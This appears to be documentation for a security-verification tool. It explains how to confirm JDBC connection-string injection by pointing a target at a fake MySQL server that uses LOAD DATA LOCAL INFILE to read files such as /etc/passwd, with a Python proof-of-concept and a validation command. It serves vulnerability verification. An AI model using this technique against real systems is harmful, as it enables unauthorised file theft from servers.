# JDBC Connection Verification

Use for JDBC connection string injection vulnerabilities (MySQL SSRF/File Read). The verification leverages a fake MySQL server to read arbitrary files from the target system when it connects to the malicious database.

## How It Works

1. Fake MySQL server listens for incoming connections
2. Generate malicious JDBC URLs with LOAD DATA LOCAL INFILE capability
3. Replace JDBC URL placeholder in PoC with the malicious URL
4. Execute PoC (target application connects to fake MySQL server)
5. Target MySQL client sends requested file content to fake server
6. Verify file content matches expected pattern

## PoC Example

```python
import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = "https://example.vulnerable.web.app.com"
    jdbc_url = "jdbc:mysql://mfs.zast.ai:3306"  # Will be replaced with actual malicious JDBC URL

    response = requests.get(
        url=f"{base_url}/api/db_connect",
        params={
            "url": jdbc_url,
            "driver": "com.mysql.cj.jdbc.Driver",
            "user": "root",
            "password": "",
        },
        headers=config.get_admin_headers(),
        cookies=config.get_admin_cookies(),
    )

    print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")
```

## Validation Command

```bash
zast-verifier validate-poc -c "%poc_code%" --method jdbc --jdbc-url-placeholder "jdbc:mysql://mfs.zast.ai:3306"
```

## Parameters

| Parameter                 | Description                                                        | Required |
|---------------------------|--------------------------------------------------------------------|----------|
| `--method`                | Use `jdbc` for this verification                                   | Yes      |
| `--jdbc-url-placeholder`  | JDBC URL placeholder in PoC to replace                             | Yes      |
| `--env-file`              | Path to environment file (default: `~/.config/zast-verifier/.env`) | No       |

## Notes

- The fake MySQL server must be running and accessible
- Target must use a vulnerable MySQL connector with `allowLoadLocal` enabled
- Works with MySQL connectors that support `LOAD DATA LOCAL INFILE`
- The verification reads `/etc/passwd` by default to confirm file access
